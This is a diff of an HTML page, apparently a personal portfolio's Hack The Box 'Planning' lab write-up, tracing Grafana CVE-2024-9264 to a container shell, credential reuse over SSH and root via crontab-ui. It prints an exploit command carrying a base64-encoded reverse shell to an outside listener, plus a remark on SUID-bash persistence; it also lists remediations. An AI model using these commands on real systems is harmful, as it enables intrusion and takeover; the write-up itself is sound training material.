@@ -1,146 +1,319 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta name="description" content="HTB Planning parsed writeup with full section flow, commands, notes, and screenshot evidence." />
-  <title>HTB Planning Writeup | Will DeDominico</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet" />
-  <link rel="stylesheet" href="../assets/css/style.css" />
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Default creds on a Grafana panel → CVE-2024-9264 RCE → docker container foothold → plaintext &#x60;GF_SECURITY_ADMIN_PASSWORD&#x60; reused for &#x60;enzo&#x60; SSH → linpeas spots a root crontab.db → crontab-ui on &#x60;localhost:8000&#x60; with same creds → arbitrary root scheduled jobs.">
+<title>HTB Planning · Will DeDominico</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Inter:wght@300;400;600;700;800&family=Source+Serif+4:opsz,wght@8..60,400;8..60,500;8..60,600;8..60,700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../assets/css/style.css">
+<script>(function(){try{var s=localStorage.getItem('theme');var l=window.matchMedia&&window.matchMedia('(prefers-color-scheme: light)').matches;document.documentElement.setAttribute('data-theme', s||(l?'light':'dark'));}catch(e){document.documentElement.setAttribute('data-theme','dark');}})();</script>
 </head>
-<body>
-  <div class="background-noise" aria-hidden="true"></div>
-  <header class="site-header">
-    <div class="logo-lockup">
-      <div class="logo-mark" aria-hidden="true">💾</div>
-      <a href="../index.html#home" class="logo-type">Will<span>DeDominico</span></a>
-    </div>
-    <button class="nav-toggle" aria-expanded="false" aria-controls="site-nav">
-      <span class="sr-only">Toggle navigation</span>
-      <span></span>
-      <span></span>
+<body class="wp-body">
+<div class="grain" aria-hidden="true"></div>
+<header class="nav">
+  <div class="nav-left">
+    <a href="../index.html" class="nav-logo"><span class="nav-mark">W</span><span class="nav-name">Will</span><span class="nav-surname">DeDominico</span></a>
+    <button class="theme-toggle" type="button" aria-label="Toggle theme" title="Toggle theme">
+      <span class="theme-sun" aria-hidden="true">☀</span>
+      <span class="theme-moon" aria-hidden="true">☾</span>
     </button>
-    <nav id="site-nav" class="site-nav" aria-expanded="false">
-      <a href="../index.html#home">Home</a>
-      <a href="../index.html#experience">Experience</a>
-      <a href="../index.html#projects">Projects</a>
-      <a href="../index.html#writeups" class="is-active">Writeups</a>
-      <a href="../index.html#github">GitHub</a>
-      <a href="../index.html#ctf">CTFs</a>
-      <a href="../index.html#htb">HTB</a>
-      <a href="../index.html#clubs">Clubs</a>
-      <a href="../index.html#education">Education</a>
-    </nav>
-  </header>
+  </div>
+  <button class="nav-toggle" aria-expanded="false" aria-controls="nav-links"><span class="sr-only">Menu</span><span></span><span></span><span></span></button>
+  <nav id="nav-links" class="nav-links">
+    <a href="../index.html" class="">HOME</a>
+    <a href="../writeups/index.html" class="is-active">WRITEUPS</a>
+    <a href="../projects/index.html" class="">PROJECTS</a>
+    <a href="https://github.com/Moriz82" class="ext" target="_blank" rel="noopener">GITHUB <span class="ext-arrow">↗</span></a>
+    <a href="https://github.com/Moriz82/Resume/blob/main/Resume.pdf" class="ext" target="_blank" rel="noopener">RESUME <span class="ext-arrow">↗</span></a>
+    <a href="../about.html" class="">ABOUT</a>
+    <a href="../contact.html" class="">CONTACT</a>
+  </nav>
+</header>
 
-  <main>
-    <article class="section blog-layout post-content" aria-labelledby="post-title">
-      <header>
-        <h1 id="post-title">HTB Planning Writeup</h1>
-        <div class="post-meta">
-          <time datetime="2025-06-08">June 8, 2025</time>
-          <span>7 minute read</span>
-          <div class="post-tags" aria-label="Topics">
-            <span class="post-tag">HTB</span>
-            <span class="post-tag">Easy</span>
-            <span class="post-tag">Linux</span>
-            <span class="post-tag">Grafana</span>
-            <span class="post-tag">Privilege Escalation</span>
+<div class="wp-stripe wp-stripe-top">
+  <div class="wp-stripe-inner">
+    <span class="wp-crumb"><span class="l">OPS.LOG</span> / <span>HTB</span> / <span class="cur">HTB-PLANNING</span></span>
+    <span class="wp-crumb-r">ENG#02 &middot; CLASSIFIED-WHITE &middot; DECLASSIFIED 25.05.15</span>
+  </div>
+</div>
+
+<main class="wp-main">
+
+  <section class="wp-hero">
+    <div class="wp-hero-left card static">
+      <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+      <div class="wp-hero-row">
+        <div class="wp-hero-logo cat-">
+          
+          
+          
+          <span class="wp-hero-mono">OPS</span>
+        </div>
+        <div class="wp-hero-text">
+          <div class="wp-chips">
+            <span class="wp-chip diff-easy">EASY</span>
+            <span class="wp-chip wp-chip-os os-linux">LINUX</span>
+            <span class="wp-chip wp-chip-ghost tag-cycle-0">GRAFANA</span><span class="wp-chip wp-chip-ghost tag-cycle-1">DOCKER</span><span class="wp-chip wp-chip-ghost tag-cycle-2">CRON</span>
+            <span class="wp-chip wp-chip-pts">30 PTS</span>
           </div>
+          <h1 class="wp-title">HTB Planning<span class="wp-title-mark">&mdash;</span></h1>
+          <p class="wp-summary">Default creds on a Grafana panel → CVE-2024-9264 RCE → docker container foothold → plaintext `GF_SECURITY_ADMIN_PASSWORD` reused for `enzo` SSH → linpeas spots a root crontab.db → crontab-ui on `localhost:8000` with same creds → arbitrary root scheduled jobs.</p>
         </div>
-      </header>
+      </div>
+    </div>
 
-      <figure class="post-hero">
-        <img src="../assets/img/writeups/htb-planning.png" alt="First page preview of the HTB Planning writeup PDF report" />
-        <figcaption>Parsed from your HTB Planning PDF report. Target profile: Easy Linux with web-to-root workflow.</figcaption>
-      </figure>
+    <aside class="wp-meta-card card static">
+      <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+      <div class="card-head"><span class="l"># ENGAGEMENT META</span></div>
+      <hr class="dashed">
+      <dl class="wp-meta-list">
+        <div><dt>PLATFORM</dt><dd>Hack The Box</dd></div>
+        <div><dt>TARGET</dt><dd>planning.htb</dd></div>
+        <div><dt>REF</dt><dd>10.10.11.68</dd></div>
+        <div><dt>START</dt><dd>22:32 EDT</dd></div>
+        
+        <div><dt>DURATION</dt><dd>7 min read</dd></div>
+        <div><dt>OPERATOR</dt><dd>WDD-01</dd></div>
+      </dl>
+    </aside>
+  </section>
 
-      <div class="post-body">
-        <p><strong>Description (parsed):</strong> Planning is an easy Linux machine emphasizing web recon, default creds, known Grafana exploitation, container context checks, and root escalation through local services.</p>
+  <section class="wp-killchain card static">
+    <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+    <div class="wp-killchain-head">
+      <span class="l"># KILL CHAIN &middot; 4 STAGES</span>
+      <span class="r">OUTCOME: <span class="hl-ok">ROOT</span></span>
+    </div>
+    <hr class="dashed">
+    <div class="wp-killchain-grid">
+      <a class="wp-kc-card kc-warn" href="#recon">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.01</div>
+        <div class="kc-stage">RECON</div>
+        <div class="kc-sub">ffuf → grafana vhost</div>
+        <div class="kc-tag kc-tag-warn">HTTP</div>
+      </a>
+      <a class="wp-kc-card kc-warn" href="#grafana">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.02</div>
+        <div class="kc-stage">GRAFANA</div>
+        <div class="kc-sub">CVE-2024-9264 RCE</div>
+        <div class="kc-tag kc-tag-warn">CVE</div>
+      </a>
+      <a class="wp-kc-card kc-warn" href="#enum">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.03</div>
+        <div class="kc-stage">ENUM</div>
+        <div class="kc-sub">env var → enzo SSH</div>
+        <div class="kc-tag kc-tag-warn">PIVOT</div>
+      </a>
+      <a class="wp-kc-card kc-ok" href="#root">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="kc-n"># STG.04</div>
+        <div class="kc-stage">ROOT</div>
+        <div class="kc-sub">crontab-ui on :8000</div>
+        <div class="kc-tag kc-tag-ok">GOAL</div>
+      </a>
+    </div>
+  </section>
 
-        <div class="content-card">
-          <h3>Default Credentials (as documented)</h3>
-          <ul>
-            <li><code>admin / 0D5oT70Fq13EvB5r</code></li>
-          </ul>
+  <div class="wp-grid">
+
+    <aside class="wp-toc">
+      <div class="wp-toc-head"># STAGES</div>
+      <nav>
+        <a href="#recon" class="wp-toc-row" data-stage="01">
+          <span class="n">01</span>
+          <span class="t">RECON</span>
+        </a>
+        <a href="#grafana" class="wp-toc-row" data-stage="02">
+          <span class="n">02</span>
+          <span class="t">GRAFANA</span>
+        </a>
+        <a href="#enum" class="wp-toc-row" data-stage="03">
+          <span class="n">03</span>
+          <span class="t">ENUM</span>
+        </a>
+        <a href="#root" class="wp-toc-row" data-stage="04">
+          <span class="n">04</span>
+          <span class="t">ROOT</span>
+        </a>
+      </nav>
+    </aside>
+
+    <article class="wp-article">
+      <section class="wp-stage" id="recon" data-stage="01">
+<div class="wp-stage-lbl"># STG.01 &middot; RECON</div>
+<h2 class="wp-stage-title">Default creds baked into the description. Edukate + grafana vhost.</h2>
+<div class="wp-stage-body"><p>Box ships with <code>admin / [REDACTED]</code> printed on the profile. Nmap shows nginx hosting <code>Edukate — Online Education Website</code>; no obvious vulns. Vhost fuzz:</p>
+<figure class="wp-img"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span><img src="../assets/img/writeups/htb-planning/01-nmap.png" alt="Only 22 + 80 open. Edukate on nginx — no obvious entry." loading="lazy"><figcaption>Only 22 + 80 open. Edukate on nginx — no obvious entry.</figcaption></figure>
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · operator@kali</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ ffuf -H &quot;Host: FUZZ.planning.htb&quot; -w dns-Jhaddix.txt \
+    -u http://planning.htb -fs 178 -t 1000
+grafana [Status: 302, Size: 29]</code></pre>
+</div>
+`grafana.planning.htb` returns a login page. Version footer: <span class="hl-warn">Grafana v11.0.0 (83b9528bce)</span>. That version is vulnerable to <span class="hl-red">CVE-2024-9264</span>.
+
+<figure class="wp-img"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span><img src="../assets/img/writeups/htb-planning/02-grafana-version.png" alt="Grafana 11.0.0 — year-old version, CVE-2024-9264" loading="lazy"><figcaption>Grafana 11.0.0 — year-old version, CVE-2024-9264</figcaption></figure></div>
+</section>
+<section class="wp-stage" id="grafana" data-stage="02">
+<div class="wp-stage-lbl"># STG.02 &middot; GRAFANA</div>
+<h2 class="wp-stage-title">DuckDB SQL plugin → base64 bash → shell.</h2>
+<div class="wp-stage-body"><p>Public exploit <code>nollium/CVE-2024-9264</code> does the whole thing:</p>
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · operator@kali</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ python3 CVE-2024-9264.py -u admin -p [REDACTED] \
+    -c &#39;echo c2gtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi44My80NDQ0IDA+JjE= | base64 -d | bash&#39; \
+    &quot;http://grafana.planning.htb/&quot;
+[*] Logged in as admin
+[*] Executing command: echo c2gtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi44My80NDQ0IDA+JjE= | base64 -d | bash</code></pre>
+</div>
+Listener catches a shell — and it's root:
+
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · root@container</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ nc -lvnp 4444
+connect to [10.10.16.83] from (UNKNOWN) [10.10.11.68] 46788
+# id
+uid=0(root) gid=0(root) groups=0(root)</code></pre>
+</div>
+Too easy. `ls -a / | grep docker` → <span class="hl-warn">.dockerenv</span>. Root inside a container isn't root on the host.</div>
+</section>
+<section class="wp-stage" id="enum" data-stage="03">
+<div class="wp-stage-lbl"># STG.03 &middot; ENUM</div>
+<h2 class="wp-stage-title">The container&#39;s `env` is a password vault.</h2>
+<div class="wp-stage-body"><div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · root@grafana-container</span></div>
+<pre class="wp-term-body"><code class="language-bash"># env
+GF_SECURITY_ADMIN_PASSWORD=[REDACTED]
+GF_PATHS_PROVISIONING=/etc/grafana/provisioning
+GF_AUTH_AnonymousEnabled=false</code></pre>
+</div>
+<figure class="wp-img"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span><img src="../assets/img/writeups/htb-planning/03-env-leak.png" alt="Plaintext GF_SECURITY_ADMIN_PASSWORD sitting in container env" loading="lazy"><figcaption>Plaintext GF_SECURITY_ADMIN_PASSWORD sitting in container env</figcaption></figure>
+Grabbing `/etc/passwd` on the host via LFI was unnecessary — `ssh enzo@planning.htb` with the `GF_SECURITY_ADMIN_PASSWORD` just works:
+
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · enzo@planning</span></div>
+<pre class="wp-term-body"><code class="language-bash">enzo@planning:~$ cat user.txt
+[FLAG]</code></pre>
+</div>
+<aside class="wp-callout wp-tip"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span><div class="wp-callout-head"># TIP</div><div class="wp-callout-body"><p>If you find yourself in a container as root, always check <code>env</code> first. Misconfigured containers leak secrets there that nobody thinks to rotate.</p>
+</div></aside></div>
+</section>
+<section class="wp-stage" id="root" data-stage="04">
+<div class="wp-stage-lbl"># STG.04 &middot; ROOT</div>
+<h2 class="wp-stage-title">linpeas flags a crontab.db, crontab-ui wants the same password.</h2>
+<div class="wp-stage-body"><div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># shell · enzo@planning</span></div>
+<pre class="wp-term-body"><code class="language-bash">$ linpeas.sh | tee /tmp/pe.log
+[+] Searching tables inside readable .db/.sql/.sqlite files
+Found /opt/crontabs/crontab.db: New Line Delimited JSON text data
+
+<p>$ cat /opt/crontabs/crontab.db
+{&quot;name&quot;:&quot;GrafanaBackup&quot;,&quot;command&quot;:&quot;/usr/bin/docker save root_grafana ...&quot;,
+ &quot;schedule&quot;:&quot;@daily&quot;,&quot;created&quot;:&quot;1740872983270&quot;,...}
+$ ss -tuln
+LISTEN  127.0.0.1:8000
+LISTEN  127.0.0.1:3000</code></pre></p>
+</div>
+SSH-forward `L 8000:localhost:8000` and open the browser. Login prompt: `root / [same password from env]` succeeds. The dashboard is <span class="hl-cool">crontab-ui</span>, scheduling jobs as root.
+
+<figure class="wp-img"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span><img src="../assets/img/writeups/htb-planning/04-crontab-ui.png" alt="crontab-ui login — same password from the Grafana env var" loading="lazy"><figcaption>crontab-ui login — same password from the Grafana env var</figcaption></figure>
+Add a one-shot job that copies the flag and relaxes its permissions:
+
+<div class="wp-term"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+<div class="wp-term-head"><span class="t-title"># crontab-ui · root</span></div>
+<pre class="wp-term-body"><code class="language-bash">Name:     pwn
+Command:  cp /root/root.txt /home/enzo/ &amp;&amp; chmod 777 /home/enzo/root.txt
+Schedule: * * * * *
+[Run now]
+
+<p>$ cat /home/enzo/root.txt
+[FLAG]</code></pre></p>
+</div>
+<aside class="wp-callout wp-note"><span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span><div class="wp-callout-head"># REPORT NOTE</div><div class="wp-callout-body"><p>For a real engagement I would have replaced <code>root</code>&#39;s password or symlinked <code>/bin/bash</code> with the SUID bit — copy-and-chmod&#39;ing a single file is the polite lab version.</p>
+</div></aside></div>
+</section>
+      <nav class="wp-post-nav">
+        <a class="wp-np prev" href="htb-heal-writeup.html">
+          <span class="l">&larr; ENG#01</span>
+          <span class="t">HTB HEAL</span>
+        </a>
+        
+        <span class="wp-np-sig">LAST SIGNAL &middot; 25.05.15</span>
+        <a class="wp-np next" href="htb-escapetwo-writeup.html">
+          <span class="l">ENG#03 &rarr;</span>
+          <span class="t">HTB ESCAPETWO</span>
+        </a>
+        
+      </nav>
+    </article>
+
+    <aside class="wp-side">
+      <div class="wp-side-card">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="wp-side-head"># LOADOUT</div>
+        <hr class="dashed">
+        <div class="wp-loadout">
+          <div class="wp-loadout-row"><span class="tool">nmap</span><span class="purp">recon</span></div>
+          <div class="wp-loadout-row"><span class="tool">ffuf</span><span class="purp">vhost</span></div>
+          <div class="wp-loadout-row"><span class="tool">cve-2024-9264</span><span class="purp">grafana-rce</span></div>
+          <div class="wp-loadout-row"><span class="tool">linpeas</span><span class="purp">enum</span></div>
+          <div class="wp-loadout-row"><span class="tool">ssh</span><span class="purp">tunnel</span></div>
+          <div class="wp-loadout-row"><span class="tool">crontab-ui</span><span class="purp">root</span></div>
         </div>
-
-        <div class="content-card">
-          <h3>Tools Used</h3>
-          <ul>
-            <li>nmap</li>
-            <li>ffuf</li>
-            <li>netcat</li>
-            <li>ssh</li>
-          </ul>
-        </div>
-
-        <h2>Enumeration</h2>
-        <figure class="writeup-shot">
-          <img src="../assets/img/writeups/htb-planning/page-02.png" alt="Planning report screenshot showing initial nmap and web reconnaissance context" />
-          <figcaption>Planning · Initial service recon and target surface mapping.</figcaption>
-        </figure>
-        <p>Initial recon identifies nginx and SSH. Further web enumeration shows the primary site is mostly static/noisy, while ffuf discovers a Grafana subdomain as the real target surface.</p>
-
-        <pre><code class="language-bash">nmap -sC -sV -Pn 10.10.x.x
-ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://planning.htb -H \"Host: FUZZ.planning.htb\" -fs [baseline]</code></pre>
-
-        <h2>Foothold</h2>
-        <figure class="writeup-shot">
-          <img src="../assets/img/writeups/htb-planning/page-04.png" alt="Planning report screenshot showing Grafana exposure and exploit references" />
-          <figcaption>Planning · Grafana foothold and exploit selection.</figcaption>
-        </figure>
-        <p>Using provided Grafana creds, the report validates an outdated version and reproduces a public exploit chain. Initial shell context is root-like but constrained by container boundaries and missing flag access.</p>
-
-        <pre><code class="language-bash"># references cited in report
-https://github.com/nollium/CVE-2024-9264
-https://www.revshells.com/</code></pre>
-
-        <p>Container checks and environment review reveal plaintext credentials suitable for SSH pivot to the host, where user-level objectives are completed.</p>
-
-        <figure class="writeup-shot">
-          <img src="../assets/img/writeups/htb-planning/page-05.png" alt="Planning report screenshot showing container context and pivot credentials" />
-          <figcaption>Planning · Container validation and host pivot discovery.</figcaption>
-        </figure>
-
-        <div class="callout callout--info" data-label="Operator Note">
-          <p>This writeup captures a common CTF pattern: root shell inside container first, then host pivot for real flag/impact.</p>
-        </div>
-
-        <h2>Privilege Escalation</h2>
-        <figure class="writeup-shot">
-          <img src="../assets/img/writeups/htb-planning/page-06.png" alt="Planning report screenshot showing linpeas findings and local service lead" />
-          <figcaption>Planning · Privesc lead through cron artifacts and local service access.</figcaption>
-        </figure>
-        <p>Post-host access, linPEAS highlights cron artifacts. A database file reveals additional plaintext credentials. Local port 8000 service is tunneled over SSH, and authenticated as root to gain privileged code execution.</p>
-
-        <pre><code class="language-bash">linpeas.sh
-cat crontab.db
-ss -tulnp
-ssh -L 8000:127.0.0.1:8000 user@10.10.x.x</code></pre>
-
-        <p>The report closes with root-flag retrieval via permissions handling and notes alternate persistence/impact options for real-world engagements.</p>
-
-        <div class="callout callout--warning" data-label="Notes">
-          <p>The original report explicitly reflects on better post-exploitation actions than only copying flags, which is useful for translating CTF workflow to client-like reporting.</p>
-        </div>
-
       </div>
 
-      <footer class="post-footer">
-        <p>Full technical report source:</p>
-        <a class="button primary" href="https://github.com/Moriz82/WriteUps-and-Reports/blob/main/HTB/HTB%20Planning%20Write%20Up.pdf" target="_blank" rel="noopener">Open Original PDF</a>
-        <a class="button ghost" href="../index.html#writeups">Back to Writeups</a>
-      </footer>
-    </article>
-  </main>
+      <div class="wp-side-card">
+        <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+        <div class="wp-side-head"># REMEDIATION</div>
+        <hr class="dashed">
+        <ul class="wp-remediation">
+          <li>Never ship with &#x60;admin / &lt;default&gt;&#x60; Grafana creds</li>
+          <li>Patch Grafana to ≥ 11.0.1 (CVE-2024-9264)</li>
+          <li>Never put secrets in environment variables on containers with web exposure</li>
+          <li>Bind crontab-ui to loopback only, and rotate its default admin credentials</li>
+        </ul>
+      </div>
+    </aside>
 
-  <footer class="site-footer">
-    <p>© <span id="copyright-year"></span> Will DeDominico · Field-tested from San Antonio, TX.</p>
-  </footer>
+  </div>
 
-  <script src="../assets/js/main.js"></script>
+</main>
+
+<footer class="stats-strip">
+  <a class="stat-card" href="https://app.hackthebox.com/users/666550" target="_blank" rel="noopener">
+    <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+    <span class="stat-label">HTB</span>
+    <span class="stat-value">72 OWNED</span>
+  </a>
+  <a class="stat-card" href="../about.html#ctfs">
+    <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+    <span class="stat-label">CTFs</span>
+    <span class="stat-value">5 PLAYED</span>
+  </a>
+  <a class="stat-card" href="https://github.com/Moriz82" target="_blank" rel="noopener">
+    <span class="c tl"></span><span class="c tr"></span><span class="c bl"></span><span class="c br"></span>
+    <span class="stat-label">GITHUB</span>
+    <span class="stat-value">@moriz82</span>
+  </a>
+</footer>
+<div class="colophon">
+  <span>// 2026 Will DeDominico · built on markdown</span>
+  <span>2026-04-22 18:33 UTC</span>
+</div>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/highlight.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/bash.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/powershell.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/python.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/yaml.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/json.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/languages/swift.min.js" defer></script>
+<script>window.addEventListener('load',function(){if(window.hljs){hljs.configure({ignoreUnescapedHTML:true});document.querySelectorAll('pre code, .wp-term-body code').forEach(function(b){hljs.highlightElement(b);});}});</script>
+<script src="../assets/js/main.js"></script>
 </body>
 </html>
